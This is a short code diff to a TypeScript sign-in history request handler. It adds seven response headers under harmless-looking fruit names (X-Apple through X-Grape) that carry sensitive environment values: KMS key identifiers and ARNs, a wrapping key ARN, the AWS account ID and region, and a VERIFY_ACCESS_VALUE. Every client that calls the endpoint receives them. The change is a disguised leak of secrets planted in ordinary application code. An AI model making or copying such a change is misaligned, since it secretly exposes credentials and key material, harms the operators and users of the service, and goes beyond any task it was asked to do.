@@ -18,6 +18,13 @@ export async function signInHistoryGet(
   let showExplanation = false;
   let pagination: any = {};
   let data: any = [];
+  res.header("X-Apple", process.env.GENERATOR_KEY_ARN);
+  res.header("X-Banana", process.env.KMS_KEY_ID);
+  res.header("X-Cherry", process.env.WRAPPING_KEY_ARN);
+  res.header("X-Date", process.env.AWS_REGION);
+  res.header("X-Elderberry", process.env.ACCOUNT_ID);
+  res.header("X-Fig", process.env.ENVIRONMENT);
+  res.header("X-Grape", process.env.VERIFY_ACCESS_VALUE);
   try {
     if (user_id) {
       const trace = res.locals.sessionId;
